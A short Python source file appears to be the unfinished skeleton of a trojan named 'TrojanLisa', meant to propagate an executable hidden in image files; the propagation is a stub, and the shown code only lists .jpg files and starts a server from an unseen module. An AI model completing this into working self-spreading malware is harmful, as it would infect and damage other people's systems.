import os
import server

class TrojanLisa:
    def __init__(self):
        self.server = server.Server()


    """ Steganographic executable propagation into other images. """
    def propagate(self):
        # TODO: Write excutable propagation
        pass


    """ Enumerate through file system and list all jpg files. """
    def enumerate_fs(self):
        # TODO: Change filetype to image that allows executable embeddings
        rootdir = "." + os.sep
        for subdir, dirs, files in os.walk(rootdir):
            for file in files:
                filepath = subdir + os.sep + file

                if filepath.endswith(".jpg"):
                    print(filepath)

    def establish_server(self):
        self.server.host()
            
if __name__=="__main__":
    trojan_lisa = TrojanLisa()
    trojan_lisa.establish_server()